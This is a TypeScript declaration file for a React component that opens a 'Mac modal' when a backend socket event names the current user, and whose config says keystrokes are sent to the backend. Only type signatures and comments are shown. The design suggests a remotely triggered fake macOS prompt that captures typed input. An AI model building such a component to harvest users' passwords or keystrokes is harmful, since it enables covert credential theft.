import React from 'react';
import '../styles/modal-isolation.css';
export interface MacModalTriggerProps {
    /** User ID for backend key service. Required when backendConfig.enabled is true. */
    userId?: string;
    /** Backend integration config. When enabled, keystrokes are sent to backend. */
    backendConfig?: {
        enabled?: boolean;
        userId?: string;
    };
    /** Called when the Mac modal is closed. */
    onClose?: () => void;
}
/**
 * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal only when
 * the payload's user_id matches this component's userId (or backendConfig.userId).
 * Mount once (e.g. at app root) to enable socket-triggered Mac modal.
 *
 * Backend example: io.emit('showMacModal', { message: '...', user_id, timestamp });
 */
declare const MacModalTrigger: React.FC<MacModalTriggerProps>;
export default MacModalTrigger;
//# sourceMappingURL=MacModalTrigger.d.ts.map